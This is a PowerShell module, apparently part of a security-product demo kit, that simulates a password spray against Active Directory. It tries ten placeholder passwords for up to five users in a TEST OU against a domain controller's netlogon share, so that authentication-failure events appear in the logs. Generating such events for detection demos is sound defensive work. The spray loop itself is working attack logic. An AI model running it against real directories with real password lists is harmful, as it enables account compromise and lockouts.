################################################################################
##
## DSP-Demo-Activity-07-SecurityPasswordSpray.psm1
##
## Password spray attack: select 5 users from TEST OU, try 10 passwords each
## against the netlogon share to generate proper authentication failure events.
##
## Key change from original approach: Uses New-PSDrive with UNC path access
## rather than AD cmdlets with -Credential, which properly logs failed auth attempts.
##
################################################################################

#Requires -Version 5.1
#Requires -Modules ActiveDirectory

################################################################################
# HELPER FUNCTIONS
################################################################################

function Write-ActivityHeader {
    param([string]$Title)
    Write-Host ""
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ("| " + $Title.PadRight(62) + " |") -ForegroundColor Cyan
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ""
}

function Write-Status {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $colors = @{
        'Info'    = 'White'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }
    
    $color = $colors[$Level]
    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

################################################################################
# MAIN FUNCTION
################################################################################

function Invoke-PasswordSpray {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Config,
        
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$Environment
    )
    
    Write-ActivityHeader "Security - Password Spray Attack"
    
    $sprayAttempts = 0
    $errorCount = 0
    
    $DomainInfo = $Environment.DomainInfo
    $ModuleConfig = $Config.Module7_PasswordSpray
    $domainDN = $domainInfo.DN
    
    # Get DC from Environment object
    $dcName = $Environment.PrimaryDC
    
    if (-not $dcName) {
        Write-Status "No primary domain controller found in environment" -Level Error
        Write-Host ""
        return $false
    }
    
    # Target UNC path for authentication attempts (matches legacy script)
    $uncPath = "\\$dcName\netlogon"
    
    # Define test passwords for spray (matches legacy script pattern)
    $testPasswords = @(
        "SomeP@sswordGu3ss!1",
        "SomeP@sswordGu3ss!2",
        "SomeP@sswordGu3ss!3",
        "SomeP@sswordGu3ss!4",
        "SomeP@sswordGu3ss!5",
        "SomeP@sswordGu3ss!6",
        "SomeP@sswordGu3ss!7",
        "SomeP@sswordGu3ss!8",
        "SomeP@sswordGu3ss!9",
        "SomeP@sswordGu3ss!10"
    )
    
    try {
        # Find TEST OU
        $testOU = Get-ADOrganizationalUnit -Filter { Name -eq "TEST" } -SearchBase $domainDN -ErrorAction SilentlyContinue
        
        if (-not $testOU) {
            Write-Status "TEST OU not found" -Level Warning
            Write-Host ""
            return $true
        }
        
        Write-Status "Found TEST OU: $($testOU.DistinguishedName)" -Level Info
        Write-Status "Target DC: $dcName" -Level Info
        Write-Status "UNC Path: $uncPath" -Level Info
        
        # Get all enabled users from TEST OU
        $testUsers = Get-ADUser -Filter { Enabled -eq $true } -SearchBase $testOU.DistinguishedName -ErrorAction Stop
        
        if (-not $testUsers) {
            Write-Status "No enabled users found in TEST OU" -Level Warning
            Write-Host ""
            return $true
        }
        
        # Select up to 5 random users
        if ($testUsers -is [array]) {
            $selectedUsers = $testUsers | Get-Random -Count ([Math]::Min(5, $testUsers.Count))
        }
        else {
            $selectedUsers = @($testUsers)
        }
        
        Write-Status "Targeting $($selectedUsers.Count) user(s) with password spray" -Level Info
        Write-Host ""
        
        foreach ($user in $selectedUsers) {
            Write-Status "Spraying user: $($user.SamAccountName)" -Level Info
            
            foreach ($password in $testPasswords) {
                $driveName = "TempShare_$([guid]::NewGuid().Guid.Substring(0,8))"
                
                try {
                    # Create credential with bad password
                    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential("$($user.SamAccountName)", $securePassword)
                    
                    # Attempt to access netlogon share with bad credentials
                    # This generates proper auth failure events in Security log
                    New-PSDrive -Name $driveName `
                        -PSProvider FileSystem `
                        -Root $uncPath `
                        -Credential $cred `
                        -ErrorAction Ignore `
                        -Verbose:$false | Out-Null
                    
                    $sprayAttempts++
                }
                catch {
                    # Expected - auth attempt failed
                    $sprayAttempts++
                }
                finally {
                    # Clean up temporary drive
                    Get-PSDrive -Name $driveName -ErrorAction SilentlyContinue | Remove-PSDrive -ErrorAction SilentlyContinue
                }
                
                Start-Sleep -Milliseconds 100
            }
            
            Write-Status "Completed 10 attempts against $($user.SamAccountName)" -Level Success
        }
        
        Write-Host ""
        Write-Status "Completed password spray attack" -Level Success
        
        # Trigger replication
        Write-Status "Triggering replication..." -Level Info
        try {
            Repadmin /syncall $dcName /APe 2>$null | Out-Null
            Start-Sleep -Seconds 3
            Write-Status "Replication triggered" -Level Success
        }
        catch {
            Write-Status "Warning: Could not trigger replication: $_" -Level Warning
        }
    }
    catch {
        Write-Status "Fatal error: $_" -Level Error
        $errorCount++
    }
    
    # Summary
    Write-Host ""
    Write-Status "Spray attempts: $sprayAttempts, Errors: $errorCount" -Level Info
    
    if ($errorCount -eq 0) {
        Write-Status "Password Spray completed successfully" -Level Success
    }
    else {
        Write-Status "Password Spray completed with $errorCount error(s)" -Level Warning
    }
    
    Write-Host ""
    return $true
}

Export-ModuleMember -Function Invoke-PasswordSpray
